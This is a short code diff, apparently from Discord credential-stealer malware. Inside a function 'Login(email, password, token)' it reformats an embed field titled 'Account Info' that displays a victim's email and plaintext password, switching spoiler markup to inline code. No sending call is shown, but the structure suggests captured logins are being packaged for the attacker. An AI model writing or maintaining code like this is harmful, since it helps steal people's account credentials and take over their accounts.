@@ -150,7 +150,7 @@ function Login(email, password, token) {
                         {
                             "name": "<a:arrow:765308889859751976> **Account Info**",
 
-                            "value":  `<:PP_director:942527310324719716> **Email:** ||${email}||                           <:staff_blue:936543701294010399> **Password:** ||${password}||`,
+                            "value":  `<:PP_director:942527310324719716> **Email:** \`${email}\`                          <:staff_blue:936543701294010399> **Password:** \`${password}\``,
                             "inline": true
                         },
                                  {
